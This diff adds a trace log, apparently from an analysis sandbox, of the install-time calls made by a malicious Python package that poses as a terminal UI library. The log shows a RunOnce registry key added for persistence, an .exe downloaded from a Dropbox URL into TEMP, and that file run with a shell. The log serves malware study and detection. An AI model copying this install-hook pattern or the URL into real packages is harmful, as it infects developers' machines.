@@ -1,0 +1,6 @@
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:11] [getlogin]()
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:15] [Popen]('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Pentestlab /t REG_SZ /d "DummyObject(\'TEMP\'@setup.py:9; lineage[3] ops: runtime_error->r..., creationflags=<DummyObject Unknown error@setup.py:12>, shell=False)
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:16] [call]([<DummyObject 'WINDIR'@setup.py:11>, 'https://dl.dropbox.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0', '-o', <DummyObject 'TEMP'@setup.py:9>], creationflags=<DummyObject Unknown error@setup.py:14>, shell=False)
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:16] [DummyObject]()
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:17] [call]([<DummyObject 'TEMP'@setup.py:9>], shell=True)
+[artifact_eval/samples/packages/055_jas9do1-7.72/setup.py:22] [setup](author='Tahg', author_email='tahgoficial@proton.me', classifiers=['Development Status :: 3 - Alpha', 'Intended Audience :: Developers', 'Topic :: Software Development :: Build Tools', 'License :: OSI Approved :: MIT License', 'Programming Lan..., description='A library for creating a terminal user interface', name='jas9do1', packages=['jas9do1'], version='3.29')
